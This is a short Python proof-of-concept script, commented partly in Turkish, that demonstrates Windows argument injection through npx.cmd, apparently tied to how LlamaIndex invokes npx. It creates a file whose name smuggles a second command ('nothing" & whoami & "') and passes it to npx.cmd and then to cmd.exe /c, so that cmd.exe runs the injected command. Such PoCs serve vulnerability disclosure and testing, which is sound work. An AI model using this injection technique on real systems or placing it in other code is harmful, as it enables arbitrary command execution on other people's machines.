import subprocess
import os
import shutil

def run_vulnerable_logic():
    print("--- Windows Argument Injection PoC (Fixed) ---")
    
    # 1. Malicious path
    malicious_path = 'nothing" & whoami & "'
    
    # 2. Dosyayı oluştur
    with open(malicious_path, "w") as f:
        f.write("test")

    print(f"[*] Created file: {malicious_path}")

    # npx.cmd Windows'ta standarttır. 
    # LlamaIndex 'npx' diyor ama Windows bunu arka planda cmd /c npx.cmd olarak yorumlar.
    # Bu yüzden tam olarak o 'kabuk' etkisini tetiklemek için npx.cmd kullanıyoruz.
    npx_path = shutil.which("npx") or "npx.cmd"
    
    command_args = [
        npx_path,
        "--version",
        "--files",
        malicious_path
    ]

    print(f"[*] Executing: subprocess.run({command_args}, shell=False)")
    print("-" * 30)

    try:
        # Bu satır Windows'ta RCE'yi tetiklemeli
        # Çünkü npx.cmd bir batch dosyasıdır ve argümanları cmd.exe'ye paslar.
        subprocess.run(command_args, check=False)
    except Exception as e:
        print(f"Error: {e}")
        print("\n[!] Deneme 2: cmd /c simülasyonu (Windows'un npx'i çalıştırma şekli)")
        # LlamaIndex npx çağırınca Windows aslında şunu yapar:
        fallback_args = ["cmd.exe", "/c", "npx", "--version", "--files", malicious_path]
        print(f"[*] Executing: {fallback_args}")
        subprocess.run(fallback_args, check=False)

if __name__ == "__main__":
    run_vulnerable_logic()
